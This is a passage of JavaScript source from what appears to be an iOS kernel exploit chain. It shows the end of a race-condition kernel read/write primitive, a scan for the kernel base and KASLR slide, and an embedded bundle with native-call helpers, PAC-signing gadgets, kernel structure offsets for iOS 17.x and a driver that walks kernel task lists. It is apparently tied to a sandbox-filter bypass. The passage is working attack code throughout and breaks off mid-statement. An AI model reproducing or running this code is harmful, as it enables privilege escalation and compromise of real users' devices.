      LOG("[+] Running on non-A18 Devices");
      pe_init();
      pe_v1();
    }
    LOG(`[+] highiest_success_idx: ${highiest_success_idx}`);
    LOG(`[+] success_read_count: ${success_read_count}`);
    uwrite64(go_sync_ptr, 0n);
    uwrite64(race_sync_ptr, 1n);
    js_thread_join(free_thread_jsthread);
    close(write_fd);
    close(read_fd);
    control_socket_pcb = early_kread64(rw_socket_pcb + 0x20n);
    let pcbinfo_pointer = early_kread64(control_socket_pcb + 0x38n);
    let ipi_zone = early_kread64(pcbinfo_pointer + 0x68n);
    let zv_name = early_kread64(ipi_zone + 0x10n);
    kernel_base = zv_name & 0xFFFFFFFFFFFFC000n;
    while (true) {
      if (early_kread64(kernel_base) == 0x100000cfeedfacfn) {
        if (early_kread64(kernel_base + 0x8n) == 0xc00000002n) {
          break;
        }
      }
      kernel_base -= PAGE_SIZE;
    }
    kernel_slide = kernel_base - 0xfffffff007004000n;
    krw_sockets_leak_forever();
  }
  mpd_js_thread_spawn = js_thread_spawn;
  mpd_js_thread_join = js_thread_join;
  mpd_pe = pe;
  mpd_kread64 = early_kread64;
  mpd_kwrite64 = early_kwrite64;
  mpd_kwrite_length = kwrite_length;
  mpd_kread_length = kread_length;
  mpd_kwrite_zone_element = kwrite_zone_element;
  mpd_control_socket = function() { return control_socket; }
  mpd_rw_socket = function() { return rw_socket; }
  mpd_pacia_gadget = function() { return dyld_signPointer_gadget; }
  mpd_kernel_slide = function (addr = 0n) {
    return addr + kernel_slide;
  };
  mpd_kernel_base = function () {
    return kernel_base;
  };
  pe();
   
  LOG("[+] PE Post-Exploitation !!!");
  LOG(`[+] kernel_base: ${mpd_kernel_base().hex()}`);
  LOG(`[+] kernel_slide: ${mpd_kernel_slide().hex()}`);
  let main = {};
  main.chainData = {
	  "chosenOffsets": null
  }
  
  try {
	  /******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js":
/*!*****************************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js ***!
  \*****************************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("/******/ (() => { // webpackBootstrap\n/******/ \t\"use strict\";\n/******/ \tvar __webpack_modules__ = ({\n\n/***/ \"./src/libs/Chain/Chain.js\":\n/*!*********************************!*\\\n  !*** ./src/libs/Chain/Chain.js ***!\n  \\*********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Chain)\n/* harmony export */ });\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n\n\nconst TAG = \"CHAIN\"\n\nclass Chain\n{\n\tstatic #driver;\n\tstatic #mutex;\n\n\tstatic init(driver, mutex=null)\n\t{\n\t\tthis.#driver = driver;\n\t\tthis.#mutex = mutex;\n\t}\n\n\tstatic destroy()\n\t{\n\t\tthis.#driver.destroy();\n\t}\n\n\tstatic runPE()\n\t{\n\t\treturn this.#driver.runPE();\n\t}\n\n\tstatic getKernelBase()\n\t{\n\t\treturn this.#driver.getKernelBase();\n\t}\n\n\tstatic getSelfTaskAddr()\n\t{\n\t\treturn this.#driver.getSelfTaskAddr();\n\t}\n\n\tstatic read(srcAddr, dst, len)\n\t{\n\t\tthis.#mutexLock();\n\t\tlet ret = this.#driver.read(srcAddr, dst, len);\n\t\tthis.#mutexUnlock();\n\t\treturn ret;\n\t}\n\n\tstatic write(dst, src, len)\n\t{\n\t\tthis.#mutexLock();\n\t\tlet ret = this.#driver.write(dst, src, len);\n\t\tthis.#mutexUnlock();\n\t\treturn ret;\n\t}\n\n\tstatic readBuff(srcAddr, len)\n\t{\n\t\tif (!this.read(srcAddr, Native.mem, len))\n\t\t\treturn false;\n\t\treturn Native.read(Native.mem, len);\n\t}\n\n\tstatic read8(src)\n\t{\n\t\tthis.read(src, Native.mem, 1);\n\t\treturn Native.read8(Native.mem);\n\t}\n\n\tstatic read16(src)\n\t{\n\t\tthis.read(src, Native.mem, 2);\n\t\treturn Native.read16(Native.mem);\n\t}\n\n\tstatic read32(src)\n\t{\n\t\tthis.read(src, Native.mem, 4);\n\t\treturn Native.read32(Native.mem);\n\t}\n\n\tstatic read64(src)\n\t{\n\t\tthis.read(src, Native.mem, 8);\n\t\treturn Native.read64(Native.mem);\n\t}\n\n\tstatic write8(dst, value)\n\t{\n\t\tNative.write8(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 1);\n\t}\n\n\tstatic write16(dst, value)\n\t{\n\t\tNative.write16(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 2);\n\t}\n\n\tstatic write32(dst, value)\n\t{\n\t\tNative.write32(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 4);\n\t}\n\n\tstatic write64(dst, value)\n\t{\n\t\tNative.write64(Native.mem, value);\n\t\tthis.write(dst, Native.mem, 8);\n\t}\n\n\tstatic offsets()\n\t{\n\t\treturn this.#driver.offsets();\n\t}\n\n\tstatic strip(val)\n\t{\n\t\treturn this.#driver.strip(val);\n\t}\n\n\tstatic writeZoneElement(dstAddr,src,len)\n\t{\n\t\treturn this.#driver.writeZoneElement(dstAddr, src, len);\n\t}\n\n\tstatic getPaciaGadget()\n\t{\n\t\treturn this.#driver.getPaciaGadget();\n\t}\n\tstatic getClearPaciaGadget()\n\t{\n\t\treturn this.#driver.getClearPaciaGadget();\n\t}\n\n\tstatic transferRW()\n\t{\n\t\tlet rwCtx = this.#driver.transferRW();\n\t\tlet controlSocket = rwCtx.controlSocket;\n\t\tlet rwSocket = rwCtx.rwSocket;\n\t\tconsole.log(TAG, \"controlSocket: \" + controlSocket);\n\t\tconsole.log(TAG, \"rwSocket: \" + rwSocket);\n\n\t\tlet portPtr = Native.mem;\n\t\tNative.callSymbol(\"fileport_makeport\", controlSocket, portPtr);\n\t\tlet controlPort = Native.read32(portPtr);\n\n\t\tNative.callSymbol(\"fileport_makeport\", rwSocket, portPtr);\n\t\tlet rwPort = Native.read32(portPtr);\n\n\t\treturn {\n\t\t\tcontrolPort: controlPort,\n\t\t\trwPort: rwPort,\n\t\t\tcontrolSocket: controlSocket,\n\t\t\trwSocket: rwSocket\n\t\t};\n\t}\n\n\tstatic threadSpawn(scriptCFString, threadMem) {\n\t\tthis.#driver.threadSpawn(scriptCFString, threadMem);\n\t}\n\n\tstatic testKRW() {\n\t\tconsole.log(TAG, \"Testing KRW\");\n\t\tconsole.log(TAG, \"- kernelBase: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(this.getKernelBase()));\n\t\tconsole.log(TAG, \"- PACIA gadget: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(this.getPaciaGadget()));\n\t\tconsole.log(TAG, \"- Read kernel magic (4 bytes)\");\n\n\t\tlet buff = this.readBuff(this.getKernelBase(), 4);\n\t\tif (!buff) {\n\t\t\tconsole.log(TAG, \"kernel RW not working!\");\n\t\t\treturn false;\n\t\t}\n\t\tlet buff32 = new Uint32Array(buff);\n\t\tconsole.log(TAG, `- Magic: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"].hex(buff32[0])}`);\n\n\t\tif (buff32[0] != 0xfeedfacf) {\n\t\t\tconsole.log(TAG, \"Invalid magic!\");\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n\tstatic #mutexLock() {\n\t\tif (this.#mutex)\n\t\t\tNative.callSymbol(\"pthread_mutex_lock\", this.#mutex);\n\t}\n\n\tstatic #mutexUnlock() {\n\t\tif (this.#mutex)\n\t\t\tNative.callSymbol(\"pthread_mutex_unlock\", this.#mutex);\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Chain/Native.js\":\n/*!**********************************!*\\\n  !*** ./src/libs/Chain/Native.js ***!\n  \\**********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Native)\n/* harmony export */ });\nconst RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;\n\nclass Native {\n\n\t// Preallocated memory chunk for general purpose stuff for public use\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\n\t// Preallocated memory chunk for encoding/decoding of string arguments\n\tstatic #argMem = 0n;\n\n\t// Pointer to next available memory for native argument\n\tstatic #argPtr = 0n;\n\n\tstatic {\n\t\tthis.mem = this.callSymbol(\"malloc\", this.memSize);\n\t\tthis.#argMem = this.callSymbol(\"malloc\", 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t}\n\n\tstatic write(ptr, buff) {\n\t\tlet buffPtr = read64(read64(addrof(buff) + 0x10n) + 0x10n);\n\t\tthis.callSymbol(\"memcpy\", ptr, buffPtr, buff.byteLength);\n\t}\n\tstatic write32(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(4);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint32(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic read(ptr, length) {\n\t\tlet buffRes = new ArrayBuffer(length);\n\t\tlet buffPtr = read64(read64(addrof(buffRes) + 0x10n) + 0x10n);\n\t\tthis.callSymbol(\"memcpy\", buffPtr, ptr, length);\n\t\treturn buffRes;\n\t}\n\n\tstatic read8(ptr) {\n\t\tlet buff = this.read(ptr, 1);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint8(0);\n\t}\n\n\tstatic read16(ptr) {\n\t\tlet buff = this.read(ptr, 2);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint16(0, true);\n\t}\n\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getUint32(0, true);\n\t}\n\n\tstatic read64(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\n\tstatic readPtr(ptr) {\n\t\treturn this.read64(ptr);\n\t}\n\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\n\tstatic write8(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(1);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint8(0, value);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write16(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(2);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint16(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write32(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(4);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setUint32(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic write64(ptr, value) {\n\t\tlet buffWrite = new ArrayBuffer(8);\n\t\tconst view = new DataView(buffWrite);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buffWrite);\n\t}\n\n\tstatic writeString(ptr, str) {\n\t\t//const buff = this.stringToBytes(str, true);\n\t\t//this.write(ptr, buff);\n\t\tthis.callSymbol(\"memcpy\", ptr, str, str.length + 1);\n\t}\n\n\tstatic getCString(str) {\n\t\treturn get_cstring(str);\n\t}\n\n\tstatic #prepareArg(arg) {\n\t\tif(!arg)\n\t\t\targ = 0n;\n\t\tif(typeof(arg) === \"string\")\n\t\t\treturn get_cstring(arg);\n\t\treturn BigInt(arg);\n\t}\n\n\tstatic strip(address) {\n\t\treturn address & 0x7fffffffffn;\n\t}\n\n\tstatic pacia(address, modifier) {\n\t\taddress = Native.strip(address);\n\t\t//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);\n\t\tlet signedAddress = pacia(address, BigInt(modifier));\n\t\t//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);\n\t\treturn signedAddress;\n\t}\n\n\tstatic dlsym(name) {\n\t\treturn Native.callSymbol(\"dlsym\", RTLD_DEFAULT, name);\n\t}\n\n\tstatic callSymbol(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {\n\t\tlet funcSymbol = null;\n\t\tif(name === \"dlysm\")\n\t\t\tfuncSymbol = DLSYM;\n\t\telse\n\t\t\tfuncSymbol = fcall(DLSYM,RTLD_DEFAULT,get_cstring(name));\n\t\ta0 = this.#prepareArg(a0);\n\t\ta1 = this.#prepareArg(a1);\n\t\ta2 = this.#prepareArg(a2);\n\t\ta3 = this.#prepareArg(a3);\n\t\ta4 = this.#prepareArg(a4);\n\t\ta5 = this.#prepareArg(a5);\n\t\ta6 = this.#prepareArg(a6);\n\t\ta7 = this.#prepareArg(a7);\n\t\ta8 = this.#prepareArg(a8);\n\t\ta9 = this.#prepareArg(a9);\n\t\ta10 = this.#prepareArg(a10);\n\t\ta11 = this.#prepareArg(a11);\n\t\ta12 = this.#prepareArg(a12);\n\t\ta13 = this.#prepareArg(a13);\n\t\ta14 = this.#prepareArg(a14);\n\t\ta15 = this.#prepareArg(a15);\n\t\tlet chosen_fcall = null;\n\t\tif(typeof fcall_with_pacia !== 'undefined')\n\t\t\tchosen_fcall = fcall_with_pacia;\n\t\telse\n\t\t\tchosen_fcall = fcall;\n\t\tconst ret64 = chosen_fcall(funcSymbol, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\tif (ret64 == 0xffffffffffffffffn)\n\t\t\treturn -1;\n\t\treturn ret64;\n\t}\n\n\tstatic callSymbolRetain(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {\n\t\treturn Native.callSymbol(name,a0,a1,a2,a3,a4,a5,a6,a7,a8, a9, a10, a11, a12, a13, a14, a15);\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\n\tstatic #doNativeCall(func, name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t// Initialize argPtr to point to general purpose memory chunk\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = func(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtr\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn this.#fromNative(ret);\n\t}\n\n\tstatic #fromNative(value) {\n\t\tif (!(value instanceof ArrayBuffer))\n\t\t\treturn value;\n\t\tconst view = new DataView(value);\n\t\treturn view.getBigInt64(0, true);\n\t}\n\n\tstatic #toNative(value) {\n\t\t// Strings need to be manually written to native memory\n\t\tif (typeof value === 'string') {\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn this.#bigIntToArray(ptr);\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn this.#bigIntToArray(value);\n\t\t}\n\t\telse\n\t\t\treturn value;\n\t}\n\n\tstatic #bigIntToArray(value) {\n\t\tlet a = new Uint8Array(8);\n\t\tfor (let i=0; i<8; i++) {\n\t\t\ta[i] = Number(value & 0xffn)\n\t\t\tvalue >>= 8n;\n\t\t}\n\t\treturn a.buffer;\n\t}\n\tstatic gc() {\n\t}\n}\n\n// Register global Native class\nglobalThis.Native = Native;\n\n\n/***/ }),\n\n/***/ \"./src/libs/Chain/OffsetsStruct.js\":\n/*!*****************************************!*\\\n  !*** ./src/libs/Chain/OffsetsStruct.js ***!\n  \\*****************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ OffsetsStruct)\n/* harmony export */ });\nconst OFFSET_KERNEL_BASE  = 0xfffffff007004000n\n//const OFFSET_KERNEL_TASK  = 0x925770n // iOS 17.5.1 - iPhone 13/13 pro max\n//const OFFSET_KERNEL_TASK 0x91d318 // iOS 17.4.1 - iPhone 13 pro max\nconst OFFSET_KERNEL_TASK = 0x0n\nconst OFFSET_TASK_MAP = 0x28n\nconst OFFSET_TASK_NEXT = 0x30n\nconst OFFSET_TASK_PREV = 0x38n\nconst OFFSET_TASK_THREADS = 0x58n\nconst OFFSET_TASK_IPC_SPACE = 0x300n\nconst OFFSET_TASK_PROC_RO = 0x3a0n\nconst OFFSET_TASK_PROC_SIZE = 0x740n // iOS 17.5.1\nconst OFFSET_TASK_EXC_GUARD = 0x5d4n\n\nconst OFFSET_IPC_SPACE_TABLE = 0x20n\nconst OFFSET_IPC_ENTRY_OBJECT =\t0x0n\nconst OFFSET_IPC_OBJECT_KOBJECT = 0x48n\nconst OFFSET_IPC_PORT_IP_NSREQUEST = 0x58n\nconst OFFSET_IPC_PORT_IP_SORIGHTS = 0x84n\n\nconst OFFSET_PROC_PID = 0x60n\nconst OFFSET_PROC_P_COMM = 0x568n\n\nconst OFFSET_THREAD_OPTIONS = 0x70n\nconst OFFSET_THREAD_KSTACKPTR = 0xf0n\nconst OFFSET_THREAD_ROP_PID = 0x160n\nconst OFFSET_THREAD_JOP_PID = 0x168n\nconst OFFSET_THREAD_GUARD_EXC_CODE = 0x330n\nconst OFFSET_THREAD_TASK_THREADS = 0x370n\nconst OFFSET_THREAD_TRO = 0x380n\nconst OFFSET_THREAD_AST = 0x3a4n\nconst OFFSET_THREAD_MUTEX_DATA = 0x3b0n\nconst OFFSET_THREAD_CTID = 0x430n\n\nconst OFFSET_TRO_TASK = 0x20n\n\nconst OFFSET_VM_HDR_RBH_ROOT = 0x38n\nconst OFFSET_VM_RBE_LEFT = 0x0n\nconst OFFSET_VM_RBE_RIGHT = 0x8n\n\nconst OFFSET_VM_OBJECT_VOU_SIZE = 0x18n\nconst OFFSET_VM_OBJECT_REF_COUNT = 0x28n\n\nconst OFFSET_VM_NAMED_ENTRY_COPY = 0x10n\nconst OFFSET_VM_NAMED_ENTRY_NEXT = 0x20n\n\nconst OFFSET_MIG_LOCK = 0x0n;\nconst OFFSET_MIG_SBXMSG = 0x0n;\nclass OffsetsStruct\n{\n\tconstructor() {\n\t\tthis.baseKernel = OFFSET_KERNEL_BASE;\n\t\tthis.kernelTask = OFFSET_KERNEL_TASK;\n\t\tthis.T1SZ_BOOT = 17n;\n\n\t\tthis.mapTask = OFFSET_TASK_MAP;\n\t\tthis.nextTask = OFFSET_TASK_NEXT;\n\t\tthis.prevTask = OFFSET_TASK_PREV;\n\t\tthis.threads = OFFSET_TASK_THREADS;\n\t\tthis.ipcSpace = OFFSET_TASK_IPC_SPACE;\n\t\tthis.procRO = OFFSET_TASK_PROC_RO;\n\t\tthis.procSize = OFFSET_TASK_PROC_SIZE;\n\t\tthis.excGuard = OFFSET_TASK_EXC_GUARD;\n\n\t\tthis.spaceTable = OFFSET_IPC_SPACE_TABLE;\n\t\tthis.entryObject = OFFSET_IPC_ENTRY_OBJECT;\n\t\tthis.objectKObject = OFFSET_IPC_OBJECT_KOBJECT;\n\t\tthis.ipNsRequest = OFFSET_IPC_PORT_IP_NSREQUEST;\n\t\tthis.ipSorights = OFFSET_IPC_PORT_IP_SORIGHTS;\n\n\t\tthis.pid = OFFSET_PROC_PID;\n\t\tthis.pComm = OFFSET_PROC_P_COMM;\n\n\t\tthis.options = OFFSET_THREAD_OPTIONS;\n\t\tthis.kstackptr = OFFSET_THREAD_KSTACKPTR;\n\t\tthis.ropPid = OFFSET_THREAD_ROP_PID;\n\t\tthis.jopPid = OFFSET_THREAD_JOP_PID;\n\t\tthis.guardExcCode = OFFSET_THREAD_GUARD_EXC_CODE;\n\t\tthis.taskThreads = OFFSET_THREAD_TASK_THREADS;\n\t\tthis.tro = OFFSET_THREAD_TRO;\n\t\tthis.ast = OFFSET_THREAD_AST;\n\t\tthis.mutexData = OFFSET_THREAD_MUTEX_DATA;\n\t\tthis.ctid = OFFSET_THREAD_CTID;\n\n\t\tthis.troTask = OFFSET_TRO_TASK;\n\n\t\tthis.hdrRBHRoot = OFFSET_VM_HDR_RBH_ROOT;\n\t\tthis.rbeLeft = OFFSET_VM_RBE_LEFT;\n\t\tthis.rbeRight = OFFSET_VM_RBE_RIGHT;\n\n\t\tthis.vouSize = OFFSET_VM_OBJECT_VOU_SIZE;\n\t\tthis.refCount = OFFSET_VM_OBJECT_REF_COUNT;\n\n\t\tthis.backingCopy = OFFSET_VM_NAMED_ENTRY_COPY;\n\t\tthis.next = OFFSET_VM_NAMED_ENTRY_NEXT;\n\t\tthis.migLock = OFFSET_MIG_LOCK;\n\t\tthis.migSbxMsg = OFFSET_MIG_SBXMSG;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Driver/DriverNewThread.js\":\n/*!********************************************!*\\\n  !*** ./src/libs/Driver/DriverNewThread.js ***!\n  \\********************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ DriverNewThread)\n/* harmony export */ });\n/* harmony import */ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./Offsets */ \"./src/libs/Driver/Offsets.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n\n\n\n\nconst TAG = \"DRIVER-NEWTHREAD\"\n\nconst EARLY_KRW_LENGTH = 0x20n;\nconst IPPROTO_ICMPV6 = 58n;\nconst ICMP6_FILTER = 18n;\n\nclass DriverNewThread\n{\n\t#offsets;\n\t#controlSocket;\n\t#rwSocket;\n\t#kernelBase;\n\t#paciaGadget;\n\t#tmpWriteMem;\n\n\tconstructor(controlSocket, rwSocket, kernelBase, paciaGadget=0n) {\n\t\tthis.#offsets = _Offsets__WEBPACK_IMPORTED_MODULE_0__[\"default\"].getByDeviceAndVersion();\n\t\tthis.#controlSocket = controlSocket;\n\t\tthis.#rwSocket = rwSocket;\n\t\tthis.#kernelBase = kernelBase;\n\t\tthis.#paciaGadget = paciaGadget;\n\t\tthis.#tmpWriteMem = Native.callSymbol(\"malloc\", EARLY_KRW_LENGTH);\n\n\t\tconsole.log(TAG, `Got RW context: ${this.#controlSocket}, ${this.#rwSocket}`);\n\t}\n\n\tdestroy() {\n\t\tconsole.log(TAG, \"Destroy\");\n\t\tNative.callSymbol(\"free\", this.#tmpWriteMem);\n\t\tNative.callSymbol(\"close\", this.#controlSocket);\n\t\tNative.callSymbol(\"close\", this.#rwSocket);\n\t}\n\n\tread(srcAddr, dst, len) {\n\t\t//console.log(TAG, `read(${Utils.hex(srcAddr)}, ${len})`);\n\t\tsrcAddr = this.strip(srcAddr);\n\t\tif (srcAddr < 0xffffffd000000000n) {\n\t\t\tconsole.log(TAG, `Invalid kaddr, cannot read: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(srcAddr)}`);\n\t\t\treturn false;\n\t\t}\n\t\treturn this.#kreadLength(srcAddr, dst, len);\n\t}\n\n\twrite(dst, src, len) {\n\t\tlet dstAddr = this.strip(dst);\n\t\tif (dstAddr < 0xffffffd000000000n) {\n\t\t\tconsole.log(TAG, `Invalid kaddr, cannot write: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(dstAddr)}`);\n\t\t\treturn false;\n\t\t}\n\t\treturn this.#kwriteLength(dst, src, len);\n\t}\n\n\twriteZoneElement(dst, src, len) {\n\t\tconst CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE = 0x20n;\n\n\t\tif (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {\n\t\t\tconsole.log(TAG, \"writeZoneElement supports only zone element size >= 0x20\");\n\t\t\treturn false;\n\t\t}\n\n\t\tlet write_size = 0n;\n\t\tlet write_offset = 0n;\n\n\t\tlet remaining = BigInt(len);\n\t\twhile (remaining != 0n) {\n\t\t\twrite_size = (remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) ?\n\t\t\t\tCHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : (remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);\n\n\t\t\tlet kwrite_dst_addr = (dst + write_offset);\n\t\t\tlet kwrite_src_addr = (src + write_offset);\n\n\t\t\tif (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {\n\t\t\t\tlet adjust = (CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size);\n\t\t\t\tkwrite_dst_addr -= adjust;\n\t\t\t\tkwrite_src_addr -= adjust;\n\t\t\t}\n\t\t\tif (!this.#kwriteLength(kwrite_dst_addr,kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE))\n\t\t\t\treturn false;\n\t\t\tremaining -= write_size;\n\t\t\twrite_offset += write_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\tstrip(val) {\n\t\t//return val & 0x7fffffffffn;\n\t\treturn val | 0xffffff8000000000n;\n\t}\n\n\toffsets() {\n\t\treturn this.#offsets;\n\t}\n\n\tgetPaciaGadget() {\n\t\treturn this.#paciaGadget;\n\t}\n\n\tgetKernelBase() {\n\t\treturn this.#kernelBase;\n\t}\n\t\n\tgetSelfTaskAddr() {\n\t\tconsole.log(TAG, `getSelfTaskAddr`);\n\n\t\tlet selfTaskKaddr = 0;\n\t\tfor (let i=0; i<5; i++)\n\t\t{\n\t\t\tselfTaskKaddr = this.#findSelfTaskKaddr(true);\n\t\t\tif (!selfTaskKaddr)\n\t\t\t{\n\t\t\t\tconsole.log(TAG, `Searching the other way around`);\n\t\t\t\tselfTaskKaddr = this.#findSelfTaskKaddr(false);\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t\tNative.callSymbol(\"usleep\",20000);\n\t\t}\n\t\treturn selfTaskKaddr;\n\t}\n\n\tthreadSpawn(scriptCFString, threadMem) {\n\t\tconsole.log(TAG, \"threadSpawn() not implemented!\");\n\t\tNative.callSymbol(\"sleep\", 2);\n\t}\n\n\t#findSelfTaskKaddr(direction) {\t\n\t\tlet kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;\n\t\tconsole.log(TAG, `baseKernel: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.#kernelBase)}, kernelTask: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kernelTaskAddr)}`);\n\t\n\t\tlet kernelTaskVal = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskAddr);\n\t\t//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);\n\t\tlet ourPid = Native.callSymbol(\"getpid\");\n\t\tconsole.log(TAG, `Our pid: ${ourPid}`);\n\t\n\t\tlet nextTask = 0n;\n\t\tif (direction)\n\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskVal + this.#offsets.nextTask);\n\t\telse\n\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskVal + this.#offsets.prevTask);\n\t\t//console.log(TAG, `nextTask: ${Utils.hex(nextTask)}`);\n\n\t\twhile (nextTask != 0 && nextTask != kernelTaskVal) {\n\t\t\tlet procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.procRO);\n\t\t\t//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);\n\t\t\tlet procVal = 